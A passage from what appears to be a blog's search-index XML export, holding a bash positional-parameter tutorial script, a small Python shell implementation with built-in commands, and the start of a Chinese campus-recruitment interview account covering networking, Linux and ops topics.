&#x540E;&#x53F0;&#x8FD0;&#x884C;&#x7684;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x7684;&#x8FDB;&#x7A0B; ID&#x53F7;$@ &#xFF1A; &#x4E0E;$&#x76F8;&#x540C;,&#x4F46;&#x662F;&#x4F7F;&#x7528;&#x65F6;&#x52A0;&#x5F15;&#x53F7;,&#x5E76;&#x5728;&#x5F15;&#x53F7;&#x4E2D;&#x8FD4;&#x56DE;&#x6BCF;&#x4E2A;&#x53C2;&#x6570;$&#xFF1A; &#x663E;&#x793A;shell&#x4F7F;&#x7528;&#x7684;&#x5F53;&#x524D;&#x9009;&#x9879;,&#x4E0E; set&#x547D;&#x4EE4;&#x529F;&#x80FD;&#x76F8;&#x540C;$? &#xFF1A; &#x663E;&#x793A;&#x6700;&#x540E;&#x547D;&#x4EE4;&#x7684;&#x9000;&#x51FA;&#x72B6;&#x6001;&#x3002; 0&#x8868;&#x793A;&#x6CA1;&#x6709;&#x9519;&#x8BEF;,&#x5176;&#x4ED6;&#x4EFB;&#x4F55;&#x503C;&#x8868;&#x660E;&#x6709;&#x9519;&#x8BEF;&#x3002;4.&#x4F4D;&#x7F6E;&#x53C2;&#x6570;&#x5B9E;&#x4F8B;&#x8FD9;&#x4E2A;&#x5341;&#x5206;&#x91CD;&#x8981;&#xFF0C;&#x5728;&#x6211;&#x4EEC;&#x8FD0;&#x884C;&#x4E00;&#x5957;&#x811A;&#x672C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6709;&#x65F6;&#x5019;&#x662F;&#x9700;&#x8981;&#x53C2;&#x6570;&#x7684;&#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x6559;&#x5927;&#x5BB6;&#x5982;&#x4F55;&#x83B7;&#x53D6;&#x53C2;&#x6570; $ vim test30.sh&#x8F93;&#x5165;&#x4EE3;&#x7801;&#xFF08;&#x4E2D;&#x6587;&#x7686;&#x4E3A;&#x6CE8;&#x91CA;&#xFF0C;&#x4E0D;&#x7528;&#x8F93;&#x5165;&#xFF09;&#xFF1A;123456789101112131415161718192021222324252627282930313233343536373839404142#!/bin/bash# &#x4F5C;&#x4E3A;&#x7528;&#x4F8B;, &#x8C03;&#x7528;&#x8FD9;&#x4E2A;&#x811A;&#x672C;&#x81F3;&#x5C11;&#x9700;&#x8981;10&#x4E2A;&#x53C2;&#x6570;, &#x6BD4;&#x5982;:# bash test.sh 1 2 3 4 5 6 7 8 9 10MINPARAMS=10echoecho &quot;The name of this script is \&quot;$0\&quot;.&quot;echo &quot;The name of this script is \&quot;`basename $0`\&quot;.&quot;echoif [ -n &quot;$1&quot; ] # &#x6D4B;&#x8BD5;&#x53D8;&#x91CF;&#x88AB;&#x5F15;&#x7528;.thenecho &quot;Parameter #1 is $1&quot; # &#x9700;&#x8981;&#x5F15;&#x7528;&#x624D;&#x80FD;&#x591F;&#x8F6C;&#x4E49;&quot;#&quot;fi if [ -n &quot;$2&quot; ]thenecho &quot;Parameter #2 is $2&quot;fi if [ -n &quot;${10}&quot; ] # &#x5927;&#x4E8E;$9&#x7684;&#x53C2;&#x6570;&#x5FC5;&#x987B;&#x7528;{}&#x62EC;&#x8D77;&#x6765;.thenecho &quot;Parameter #10 is ${10}&quot;fi echo &quot;-----------------------------------&quot;echo &quot;All the command-line parameters are: &quot;$*&quot;&quot;if [ $# -lt &quot;$MINPARAMS&quot; ]then echo echo &quot;This script needs at least $MINPARAMS command-line arguments!&quot;fi echoexit 0 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>bash</category>
      </categories>
      <tags>
        <tag>bash</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Simple shell implementation based on Python]]></title>
    <url>%2F2018%2F10%2F21%2FSimple-shell-implementation-based-on-Python%2F</url>
    <content type="text"><![CDATA[&#x6587;&#x4EF6;&#x7ED3;&#x6784;&#xFF1A;|&#x2014;-shell.py|| |&#x2014;-cd.py| |&#x2014;-constants.py|&#x2014;-|&#x2014;-exit.py |&#x2014;-getenv.py |&#x2014;-history.py |&#x2014;-init.py shell.py:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#coding:utf-8import osimport sysimport shleximport getpassimport socketimport signalimport subprocessimport platformfrom func import *built_in_cmds = {}def tokenize(string): return shlex.split(string) def preprocess(tokens): processed_token = [] for token in tokens: if token.startswith(&apos;$&apos;): processed_token.append(os.getenv(token[1:])) else: processed_token.append(token) return processed_tokendef handler_kill(signum, frame): raise OSError(&quot;Killed!&quot;)def execute(cmd_tokens): with open(HISTORY_PATH, &apos;a&apos;) as history_file: history_file.write(&apos; &apos;.join(cmd_tokens) + os.linesep) if cmd_tokens: cmd_name = cmd_tokens[0] cmd_args = cmd_tokens[1:] if cmd_name in built_in_cmds: return built_in_cmds[cmd_name](cmd_args) signal.signal(signal.SIGINT, handler_kill) if platform.system() != &quot;Windows&quot;: p = subprocess.Popen(cmd_tokens) p.communicate() else: command = &quot;&quot; command = &apos; &apos;.join(cmd_tokens) os.system(command) return SHELL_STATUS_RUNdef display_cmd_prompt(): user = getpass.getuser() hostname = socket.gethostname() cwd = os.getcwd() base_dir = os.path.basename(cwd) home_dir = os.path.expanduser(&apos;~&apos;) if cwd == home_dir: base_dir = &apos;~&apos; if platform.system() != &apos;Windows&apos;: sys.stdout.write(&quot;[\033[1;33m%s\033[0;0m@%s \033[1;36m%s\033[0;0m] $ &quot; % (user, hostname, base_dir)) else: sys.stdout.write(&quot;[%s@%s %s]$ &quot; % (user, hostname, base_dir)) sys.stdout.flush()def ignore_signals(): if platform.system() != &quot;Windows&quot;: signal.signal(signal.SIGTSTP, signal.SIG_IGN) signal.signal(signal.SIGINT, signal.SIG_IGN)def shell_loop(): status = SHELL_STATUS_RUN while status == SHELL_STATUS_RUN: display_cmd_prompt() ignore_signals() try: cmd = sys.stdin.readline() cmd_tokens = tokenize(cmd) cmd_tokens = preprocess(cmd_tokens) status = execute(cmd_tokens) except: _, err, _ = sys.exc_info() print(err)def register_command(name, func): built_in_cmds[name] = funcdef init(): register_command(&quot;cd&quot;, cd) register_command(&quot;exit&quot;, exit) register_command(&quot;getenv&quot;, getenv) register_command(&quot;history&quot;, history)def main(): init() shell_loop()if __name__ == &quot;__main__&quot;: main() cd.py123456789#coding:utf-8from .constants import *def cd(args): if len(args) &gt; 0: os.chdir(args[0]) else: os.chdir(os.getenv(&apos;HOME&apos;)) return SHELL_STATUS_RUN constants.py12345678#coding:utf-8import osSHELL_STATUS_STOP = 0SHELL_STATUS_RUN = 1# &#x4F7F;&#x7528; os.path.expanduser(&apos;~&apos;) &#x83B7;&#x53D6;&#x5F53;&#x524D;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x5E73;&#x53F0;&#x7684;&#x5F53;&#x524D;&#x7528;&#x6237;&#x6839;&#x76EE;&#x5F55;HISTORY_PATH = os.path.expanduser(&apos;~&apos;) + os.sep + &apos;.shiyanlou_shell_history&apos; exit.py12345#coding:utf-8from .constants import *def exit(args): return SHELL_STATUS_STOP getenv.py1234567#coding:utf-8from .constants import *def getenv(args): if len(args) &gt; 0: print(os.getenv(args[0])) return SHELL_STATUS_RUN history.py12345678910111213141516#coding:utf-8import sysfrom .constants import *def history(args): with open(HISTORY_PATH, &apos;r&apos;) as history_file: lines = history_file.readlines() limit = len(lines) if len(args) &gt; 0: limit = int(args[0]) start = len(lines) - limit for line_num, line in enumerate(lines): if line_num &gt;= start: sys.stdout.write(&apos;%d %s&apos; % (line_num + 1, line)) sys.stdout.flush() return SHELL_STATUS_RUN init.py12345from .cd import cdfrom .exit import exitfrom .getenv import getenvfrom .history import historyfrom .constants import * &#x8FD0;&#x884C;&#x7ED3;&#x679C;&#xFF1A; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[the difference between people]]></title>
    <url>%2F2018%2F10%2F16%2Fthe-difference-of-people%2F</url>
    <content type="text"><![CDATA[&#x4F5C;&#x8005;&#xFF1A;&#x975E;&#x8863;&#x94FE;&#x63A5;&#xFF1A;https://www.nowcoder.com/discuss/18612&#x6765;&#x6E90;&#xFF1A;&#x725B;&#x5BA2;&#x7F51; &#x9898;&#x5916;&#x8BDD;&#x79CB;&#x62DB;&#x5DF2;&#x7ECF;&#x7ED3;&#x675F;&#x4E86;&#xFF0C;&#x60F3;&#x4E86;&#x60F3;&#x8FD8;&#x662F;&#x51C6;&#x5907;&#x628A;&#x81EA;&#x5DF1;&#x7684;&#x9762;&#x8BD5;&#x5386;&#x7A0B;&#x5199;&#x4E00;&#x4E0B;&#x3002;&#x4E5F;&#x7B97;&#x662F;&#x5BF9;&#x5927;&#x5B66;&#x56DB;&#x5E74;&#x7684;&#x4E00;&#x4E2A;&#x4EA4;&#x4EE3;&#x3002; &#x81EA;&#x5DF1;&#x5E94;&#x8BE5;&#x7B97;&#x662F;&#x4E00;&#x4E2A;&#x5C0F;&#x767D;&#x5427;&#xFF0C;&#x5C31;&#x8BFB;&#x4E8E;&#x897F;&#x5B89;&#x79D1;&#x6280;&#x5927;&#x5B66;&#xFF0C;&#x73AF;&#x5883;&#x5DE5;&#x7A0B;&#x4E13;&#x4E1A;&#x3002;&#x975E;985&#xFF0C;&#x975E;211&#x3002;&#x5B66;&#x6821;&#x548C;&#x897F;&#x5B89;&#x7535;&#x5B50;&#x79D1;&#x6280;&#x5927;&#x5B66;&#x5C31;&#x5DEE;&#x4E24;&#x4E2A;&#x5B57;&#xFF0C;&#x4F46;&#x5DEE;&#x7684;&#x5F88;&#x8FDC;&#xFF0C;&#x5750;&#x843D;&#x5728;&#x9A8A;&#x5C71;&#x811A;&#x4E0B;&#x3002;&#x672C;&#x8EAB;&#x7B97;&#x662F;&#x5BF9;&#x8BA1;&#x7B97;&#x673A;&#x611F;&#x5174;&#x8DA3;&#xFF0C;&#x4F46;&#x8FD8;&#x662F;&#x6BD4;&#x8F83;&#x5F31;&#x3002;&#x6CA1;&#x6709;&#x540D;&#x4F01;&#x5B9E;&#x4E60;&#x7ECF;&#x5386;&#xFF0C;&#x4E5F;&#x6CA1;&#x6709;&#x5389;&#x5BB3;&#x7684;&#x9879;&#x76EE;&#x7ECF;&#x9A8C;&#xFF0C;&#x8FDE;&#x4E13;&#x4E1A;&#x4E5F;&#x4E0E;&#x8BA1;&#x7B97;&#x673A;&#x4E0D;&#x76F8;&#x5173;&#x3002;&#x5F88;&#x60F3;&#x53BB;BAT&#xFF0C;&#x7F51;&#x6613;&#xFF0C;&#x7F51;&#x6613;&#x6E38;&#x620F;&#x2026;&#xFF0C;&#x4E0E;&#x7F51;&#x6613;&#x6E38;&#x620F;&#x7684;&#x4E09;&#x9762;&#x4E4B;&#x7F18;&#xFF1B;&#x963F;&#x91CC;&#x7684;20&#x591A;&#x8F6E;&#x9762;&#x8BD5;&#xFF0C;&#x4E94;&#x4E2A;&#x5DF2;&#x56DE;&#x7EDD;&#xFF1B;&#x817E;&#x8BAF;&#x6625;&#x62DB;&#x90A3;&#x4E24;&#x4E2A;&#x5BBD;&#x5BB9;&#x548C;&#x853C;&#x7684;&#x9762;&#x8BD5;&#x5B98;&#xFF1B;&#x4E0E;&#x767E;&#x5EA6;&#x4E4B;&#x95F4;&#x7684;&#x9057;&#x61BE;&#xFF1B;&#x8FD8;&#x6709;&#x5B9E;&#x9A8C;&#x697C;&#x9762;&#x8BD5;&#x5B98;&#x7684;&#x7406;&#x89E3;&#x2026; ,&#x5F88;&#x591A;&#x90FD;&#x662F;&#x5728;&#x6821;&#x62DB;&#x8DEF;&#x4E0A;&#x7684;&#x7ECF;&#x9A8C;&#x3002;&#x5B9E;&#x4E60;&#x771F;&#x7684;&#x5F88;&#x91CD;&#x8981;&#xFF0C;&#x5C24;&#x5176;&#x65F6;&#x540D;&#x4F01;&#x5B9E;&#x4E60;&#xFF0C;&#x53EF;&#x4EE5;&#x5F88;&#x5927;&#x7A0B;&#x5EA6;&#x4E0A;&#x5E2E;&#x52A9;&#x4F60;&#x901A;&#x8FC7;&#x9762;&#x8BD5;&#x3002; &#x9762;&#x8BD5;&#x65F6;&#x5B9E;&#x529B;&#x4E0E;&#x8FD0;&#x6C14;&#x7684;&#x7ED3;&#x5408;&#xFF0C;&#x5F53;&#x7136;&#x4F60;&#x5B9E;&#x529B;&#x8D8A;&#x5F3A;&#xFF0C;&#x90A3;&#x4E48;&#x6240;&#x9700;&#x8981;&#x7684;&#x8FD0;&#x6C14;&#x5C31;&#x53EF;&#x4EE5;&#x6E10;&#x6E10;&#x5FFD;&#x7565;&#x3002;&#x81EA;&#x5DF1;&#x7684;&#x5B66;&#x4E60;&#x4E4B;&#x8DEF;&#xFF0C;&#x4ECE;C/C &#x5230;java&#xFF0C;&#x518D;&#x5230;python&#x4EE5;&#x53CA;&#x73B0;&#x5728;&#x7684;&#x8FD0;&#x7EF4;&#x7814;&#x53D1;&#x3002;&#x575A;&#x6301;&#x81EA;&#x5DF1;&#x7684;&#x68A6;&#x60F3;&#xFF0C;&#x8D70;&#x4E0B;&#x53BB;&#xFF0C;&#x603B;&#x4F1A;&#x770B;&#x5230;&#x5E0C;&#x671B;&#x3002; &#x6821;&#x62DB;&#x4E4B;&#x8DEF;&#x5B9E;&#x4E60;&#x5B9E;&#x4E60;&#x5230;&#x6700;&#x540E;&#x81EA;&#x5DF1;&#x62FF;&#x5230;&#x4E86;&#x767E;&#x5EA6;/&#x8C4C;&#x8C46;&#x835A;&#x7684;offer&#xFF0C;&#x4F46;&#x7531;&#x4E8E;&#x4E2A;&#x4EBA;&#x539F;&#x56E0;&#xFF0C;&#x6700;&#x540E;&#x6CA1;&#x53BB;&#x5B9E;&#x4E60;&#x3002; &#x5386;&#x7A0B;&#xFF08;&#x4E3B;&#x8981;&#x662F;&#x8FD0;&#x7EF4;&#xFF09;&#x817E;&#x8BAF;&#x5185;&#x63A8; omg&#xFF08;&#x4E00;&#x9762;&#x2013;&gt; hr&#x6302;&#xFF09; &#x817E;&#x8BAF;&#x6625;&#x62DB; teg &#xFF08;&#x4E00;&#x9762;&#x2013;&gt; &#x4E8C;&#x9762;&#x6302;&#xFF09; &#x767E;&#x5EA6;&#x5185;&#x63A8; &#xFF08;&#x4E00;&#x9762;&#x2013;&gt; &#x4E8C;&#x9762;&#x6302; &#xFF09; &#x767E;&#x5EA6;&#x6625;&#x62DB; &#xFF08;offer&#xFF09; &#x997F;&#x4E86;&#x4E48; &#xFF08;&#x4E8C;&#x9762;&#x6302;&#xFF09; &#x7F51;&#x6613;&#x6E38;&#x620F;&#x96F7;&#x706B;&#x76D8;&#x53E4; &#xFF08;&#x4E8C;&#x9762;&#x6302;&#xFF09; &#x8C4C;&#x8C46;&#x835A; &#xFF08;offer&#xFF09; &#x963F;&#x91CC;&#xFF08;&#x9762;&#x4E86;&#x597D;&#x591A;&#x9762;&#xFF0C;&#x51E0;&#x4E2A;&#x804C;&#x4F4D;&#x90FD;&#x6302;&#x4E86;&#xFF09; &#x7F51;&#x6613;&#x7B14;&#x8BD5;&#x8FC7;&#x4E86;&#xFF0C;&#x6CA1;&#x6709;&#x9762;&#x8BD5; &#x9762;&#x8BD5;&#x4E2D;&#x7684;&#x95EE;&#x9898;&#x5B9E;&#x4E60;&#x751F;&#x9762;&#x8BD5;&#x57FA;&#x672C;&#x5F88;&#x770B;&#x91CD;&#x57FA;&#x7840;&#xFF0C;&#x5BF9;&#x57FA;&#x7840;&#x8003;&#x5BDF;&#x5F88;&#x7EC6;&#xFF0C;&#x5728;&#x8FD0;&#x7EF4;&#x8FD9;&#x4E00;&#x5757;&#xFF0C;&#x4E3B;&#x8981;&#x8003;&#x5BDF;&#x7F51;&#x7EDC;&#x548C;linux&#x57FA;&#x7840;&#x3002; &#x7F51;&#x7EDC; tcp/ip &#x4E09;&#x6B21;&#x63E1;&#x624B;/&#x56DB;&#x6B21;&#x6325;&#x624B;&#x8FC7;&#x7A0B;&#xFF08;&#x817E;&#x8BAF;/&#x767E;&#x5EA6;/&#x8C4C;&#x8C46;&#x835A;&#xFF09; tcp&#x8FDE;&#x63A5;&#x4E2D;&#x5404;&#x4E2A;&#x72B6;&#x6001;&#x7684;&#x542B;&#x4E49;&#xFF08;&#x91CD;&#x70B9;&#x5728;time_wait&#xFF09;&#xFF08;&#x767E;&#x5EA6;/&#x963F;&#x91CC;&#xFF09; &#x7B2C;&#x4E09;&#x6B21;&#x63E1;&#x624B;&#x5931;&#x8D25;&#xFF0C;&#x6216;&#x8005;&#x67D0;&#x4E00;&#x4E2A;&#x72B6;&#x6001;&#x9519;&#x8BEF; &#xFF08;&#x5F15;&#x51FA;&#x8BA1;&#x65F6;&#x5668;&#xFF0C;&#x4EE5;&#x53CA;&#x91CD;&#x4F20;&#xFF0C;SYN&#x653B;&#x51FB;&#xFF09;&#xFF08;&#x7F51;&#x6613;&#x6E38;&#x620F;&#xFF09; &#x56DE;&#x9000;N&#x5E27;&#x534F;&#x8BAE;&#xFF08;&#x963F;&#x91CC;/&#x767E;&#x5EA6;&#xFF09; &#x62E5;&#x585E;&#x907F;&#x514D;/&#x6162;&#x542F;&#x52A8;/&#x5FEB;&#x91CD;&#x4F20;/&#x5FEB;&#x901F;&#x6062;&#x590D;&#xFF08;&#x6240;&#x6709;&#x516C;&#x53F8;&#x90FD;&#x6709;&#x95EE;&#xFF09; tcp&#x4E0E;udp&#x7684;&#x533A;&#x522B; &#x683C;&#x5F0F; HTTP&#x534F;&#x8BAE; &#x72B6;&#x6001;&#x7801; &#x957F;&#x8FDE;&#x63A5;&#x4E0E;&#x77ED;&#x8FDE;&#x63A5;&#x7684;&#x533A;&#x522B;&#xFF08;LVS&#x662F;&#x901A;&#x8FC7;&#x957F;&#x8FDE;&#x63A5;&#x4F5C;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#xFF09;&#xFF08;&#x767E;&#x5EA6;/&#x963F;&#x91CC;/&#x8C4C;&#x8C46;&#x835A;&#xFF09; &#x683C;&#x5F0F; DNS &#x8BB0;&#x5F55;dns&#x7684;&#x89E3;&#x6790;&#xFF08;&#x9012;&#x5F52;&#x548C;&#x8FED;&#x4EE3;&#xFF09;&#x4EC0;&#x4E48;&#x65F6;&#x5019;&#x7528;udp/tcp&#x8DEF;&#x7531; &#x8DEF;&#x7531;&#x4E0E;&#x4EA4;&#x6362;&#x673A;&#x7684;&#x533A;&#x522B; &#x8DEF;&#x7531;&#x534F;&#x8BAE;&#xFF08;RIP/OPSF&#xFF09; &#x5176;&#x5B83;&#x7684;&#x4E00;&#x4E9B; vlan/vxlan&#xFF08;&#x7F51;&#x6613;&#x6E38;&#x620F;&#xFF09;linux &#x57FA;&#x672C;&#x547D;&#x4EE4; &#x6709;&#x5173;&#x8FDB;&#x7A0B;&#xFF08;ps/top&#xFF09; &#x7F51;&#x7EDC; &#xFF08;netstat/ss/ping/traceroute/tcpdump&#xFF09; &#x4E00;&#x822C;&#x4F1A;&#x5728;&#x95EE;&#x5B8C;&#x7F51;&#x7EDC;&#x65F6;&#xFF0C;&#x5F00;&#x59CB;&#x95EE;&#x76F8;&#x5173;&#x7684;&#x547D;&#x4EE4; &#x5185;&#x5B58;&#xFF08;free &#x4F1A;&#x95EE;&#x5230;buff/cache&#xFF09; &#x6587;&#x4EF6;&#x5904;&#x7406;&#xFF08;grep/sed/awk&#xFF09;&#x5F88;&#x91CD;&#x8981;&#xFF0C;&#x9762;&#x8BD5;&#x5FC5;&#x95EE; &#x4E00;&#x4E9B;&#x65E5;&#x5E38;&#x811A;&#x672C; iptables &#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#xFF08;ext4&#xFF09; &#x8D85;&#x7EA7;&#x5757; cp/mv&#x7684;&#x533A;&#x522B;&#xFF08;&#x6309;&#x6211;&#x7684;&#x7406;&#x89E3;&#x7B54;&#x4E86;&#x4E0B;&#xFF0C;&#x4F46;&#x963F;&#x91CC;&#x9762;&#x8BD5;&#x5B98;&#x95EE;&#x7684;&#x5B9E;&#x73B0;&#xFF0C;&#x6CA1;&#x7B54;&#x597D;&#xFF09; &#x8F6F;&#x786C;&#x8FDE;&#x63A5;&#xFF08;inode&#x8FD9;&#x5757;&#xFF0C;ln / ln -s&#xFF09; &#x5185;&#x6838;&#x8C03;&#x4F18;&#xFF08;&#x4E00;&#x4E9B;&#x5E38;&#x7528;&#x53C2;&#x6570;&#x7684;&#x4F18;&#x5316;&#xFF0C;&#x4E00;&#x822C;&#x662F;tcp&#x8FD9;&#x5757;&#x7684;&#xFF0C;&#x4F1A;&#x5728;time_wait&#x548C;syn&#x653B;&#x51FB;&#x8FD9;&#x5757;&#x95EE;&#xFF0C;&#x8FD8;&#x6709;&#x5C31;&#x662F;apache&#x90A3;&#x5757;&#xFF0C;&#x767E;&#x5EA6;&#x9762;&#x8BD5;&#x5B98;&#x95EE;select&#x8FD9;&#x5757;&#xFF0C;&#x63D0;&#x8FC7;&#xFF09; &#x5F00;&#x673A;&#x542F;&#x52A8;&#x8FC7;&#x7A0B; &#x4E00;&#x4E9B;&#x8FD0;&#x7EF4;&#x76F8;&#x5173;&#x7684;&#x77E5;&#x8BC6; &#x64CD;&#x4F5C;&#x7CFB;&#x7EDF; &#x8FDB;&#x7A0B;vs&#x7EBF;&#x7A0B;&#xFF08;&#x6BCF;&#x6B21;&#x9762;&#x8BD5;&#x5FC5;&#x95EE;&#xFF09; &#x6BB5;&#x9875;&#xFF08;&#x767E;&#x5EA6;&#x63D0;&#x4E86;&#x4E00;&#x4E0B;&#xFF0C;&#x7B54;&#x7684;&#x5F88;&#x5DEE;&#xFF09; IO&#x6A21;&#x578B;&#x4ECB;&#x7ECD;&#x4EE5;&#x53CA;&#x540C;&#x6B65;&#x5F02;&#x6B65;&#x963B;&#x585E;&#x975E;&#x963B;&#x585E;&#x7684;&#x533A;&#x522B;&#xFF08;nginx&#x4E0E;apache&#x6BD4;&#x8F83;&#x65F6;&#xFF0C;&#x901A;&#x5E38;&#x4F1A;&#x95EE;&#x5230;&#xFF09;select/poll/epoll python &#x95ED;&#x5305; / &#x88C5;&#x9970;&#x5668;&#xFF08;&#x7F51;&#x6613;&#x6E38;&#x620F;/&#x963F;&#x91CC;/&#x767E;&#x5EA6;&#xFF09; &#x8FED;&#x4EE3;&#x5668; / &#x751F;&#x6210;&#x5668; &#xFF08;&#x817E;&#x8BAF;/&#x7F51;&#x6613;&#x6E38;&#x620F;/&#x767E;&#x5EA6;&#xFF09; &#x591A;&#x7EBF;&#x7A0B; thread/threading &#xFF08;&#x8981;&#x4E48;&#x7EE7;&#x627F;&#x7EBF;&#x7A0B;&#x7C7B;&#xFF0C;&#x91CD;&#x5199;run&#x65B9;&#x6CD5;&#xFF1B;&#x8981;&#x4E48;&#x5C31;&#x628A;&#x51FD;&#x6570;&#x5F53;&#x53C2;&#x6570;&#x4F20;&#x5165;&#xFF09; &#x5185;&#x5B58;&#x7BA1;&#x7406;&#xFF08;&#x5F3A;&#x70C8;&#x63A8;&#x8350;&#x770B;&#x300A;&#x5783;&#x573E;&#x56DE;&#x6536;&#x7684;&#x7B97;&#x6CD5;&#x4E0E;&#x5B9E;&#x73B0;&#x300B;&#xFF09; &#x5F15;&#x7528;&#x8BA1;&#x6570;&#x5783;&#x573E;&#x56DE;&#x6536;&#x5F15;&#x7528;&#x8BA1;&#x6570;&#x6807;&#x8BB0;-&#x6E05;&#x9664;&#x5206;&#x4EE3;&#x6536;&#x96C6;mysql &#x57FA;&#x672C;sql&#x8BED;&#x53E5; &#x4E3B;&#x4ECE;&#x590D;&#x5236;&#xFF08;&#x67B6;&#x6784;/&#x9519;&#x8BEF;&#x6062;&#x590D;/MHA&#xFF09; mysql&#x5B58;&#x50A8;&#x5F15;&#x64CE; &#x5907;&#x4EFD;&#xFF08;&#x70ED;&#x5907;/&#x51B7;&#x5907;&#xFF09; &#x8FD0;&#x7EF4;&#x76F8;&#x5173; LVS&#x56DB;&#x79CD;&#x6A21;&#x5F0F;&#xFF08;&#x963F;&#x91CC;&#x7279;&#x522B;&#x559C;&#x6B22;&#x95EE;&#xFF0C;&#x817E;&#x8BAF;&#x4E5F;&#x95EE;&#x8FC7;&#xFF09; &#x8D1F;&#x8F7D;&#x5747;&#x8861;&#xFF08;DNS/nginx/LVS/vipserver&#xFF09; &#x9AD8;&#x53EF;&#x7528;&#x96C6;&#x7FA4;&#xFF08;heardbead/keepalived &#xFF09; heardbead&#x4E0E;keepalived&#x7684;&#x533A;&#x522B;&#xFF0C;&#x8111;&#x88C2;&#x95EE;&#x9898;&#x7684;&#x89E3;&#x51B3;&#xFF0C;&#x9AD8;&#x53EF;&#x7528;&#x65B9;&#x6848;&#x7684;&#x4F18;&#x52A3; &#x6848;&#x4F8B;&#x5206;&#x6790; &#x9762;&#x8BD5;&#x817E;&#x8BAF;&#x5185;&#x63A8; &#x4E00;&#x9762;&#x95EE;&#x4E86;linux&#x57FA;&#x7840;&#xFF0C;top/ps&#x4E00;&#x4E9B;&#x547D;&#x4EE4;&#xFF0C;&#x4EE5;&#x53CA;&#x4E00;&#x4E9B;&#x5E38;&#x7528;&#x7684;&#x76D1;&#x63A7;&#x8F6F;&#x4EF6;&#x7684;&#x4F7F;&#x7528;&#x6BD4;&#x8F83;&#x3002;&#x5F53;&#x7136;&#xFF0C;&#x5FC5;&#x95EE;&#x7684;lvs&#xFF0C;&#x5B9E;&#x73B0;&#x4EE5;&#x53CA;&#x539F;&#x7406;&#x3002;tcp&#x4E09;&#x6B21;&#x63E1;&#x624B;/&#x56DB;&#x6B21;&#x6325;&#x624B;&#x3002;&#x8FD8;&#x95EE;&#x4E86;&#x81EA;&#x5DF1;&#x7684;&#x7231;&#x597D;&#xFF0C;&#x548C;&#x5B66;&#x4E60;&#x5386;&#x7A0B;&#x3002;&#x4E4B;&#x540E;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x6708;&#x7684;&#x7B49;&#x5F85;&#xFF0C;&#x4E00;&#x5929;&#x4E0B;&#x5348;&#xFF0C;hr&#x6253;&#x6765;&#x7535;&#x8BDD;&#xFF0C;hr&#x9762;&#x8868;&#x73B0;&#x4E0D;&#x597D;&#xFF0C;&#x6302;&#x4E86;&#x3002; &#x6B63;&#x5F0F;&#x6821;&#x62DB; &#x4E00;&#x9762;&#xFF1A;&#x5F53;&#x65F6;&#x8D85;&#x7EA7;&#x7D27;&#x5F20;&#xFF0C;&#x8FDE;&#x8BDD;&#x90FD;&#x8BF4;&#x4E0D;&#x51FA;&#x6765;&#xFF0C;&#x8FD8;&#x597D;&#x9762;&#x8BD5;&#x5B98;&#x5F88;nice&#xFF0C;&#x4E3B;&#x52A8;&#x95EE;&#x6211;&#x7B80;&#x5386;&#x4E0A;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x5BF9;&#x6211;&#x505A;&#x7684;&#x4E00;&#x4E9B;&#x5C0F;&#x7A0B;&#x5E8F;&#x5F88;&#x611F;&#x5174;&#x8DA3;&#x3002;&#x4E4B;&#x540E;&#x7B49;&#x6211;&#x7F13;&#x89E3;&#x4E4B;&#x540E;&#xFF0C;&#x518D;&#x8BA9;&#x6211;&#x81EA;&#x6211;&#x4ECB;&#x7ECD; &#x4E8C;&#x9762;&#xFF1A;&#x4E8C;&#x9762;&#x9762;&#x8BD5;&#x5B98;&#x8BA9;&#x4EBA;&#x89C9;&#x5F97;&#x4E5F;&#x5F88;&#x4EB2;&#x5207;&#xFF0C;&#x95EE;&#x4E86;&#x5F88;&#x591A;&#x5BB6;&#x5EAD;&#x65B9;&#x9762;&#x7684;&#x95EE;&#x9898;&#x3002;&#x867D;&#x7136;&#x6700;&#x540E;&#x8FD8;&#x662F;&#x6302;&#x4E86;&#xFF0C;&#x4F46;&#x8FD8;&#x662F;&#x5F88;&#x611F;&#x8C22;&#x9762;&#x8BD5;&#x5B98;&#x3002; &#x767E;&#x5EA6;&#x767E;&#x5EA6;&#x5185;&#x63A8;&#x548C;&#x6B63;&#x5F0F;&#x6821;&#x62DB;&#x95EE;&#x7684;&#x95EE;&#x9898;&#x5DEE;&#x4E0D;&#x591A;&#x90FD;&#x4E00;&#x6837;&#x3002; RAID &#x7684;&#x5404;&#x4E2A;&#x7EA7;&#x522B;&#x53CA;&#x533A;&#x522B;python &#x4E2D; list &#x548C; tuple &#x7684;&#x533A;&#x522B; list &#x662F;&#x53EF;&#x53D8;&#x7684;&#xFF0C;tuple &#x662F;&#x4E0D;&#x53EF;&#x53D8;&#x7684;&#xFF0C;&#x53EF;&#x53D8;&#x4E0E;&#x53EF;&#x53D8;&#x8BF4;&#x7684;&#x662F;&#x5185;&#x5B58;&#x5730;&#x5740;&#x662F;&#x5426;&#x53EF;&#x53D8;&#x3002;tcp &#x7684;&#x6162;&#x542F;&#x52A8; &#x4E3A;&#x4E86;&#x8FDB;&#x884C;&#x6D41;&#x91CF;&#x63A7;&#x5236;&#xFF0C;TCP 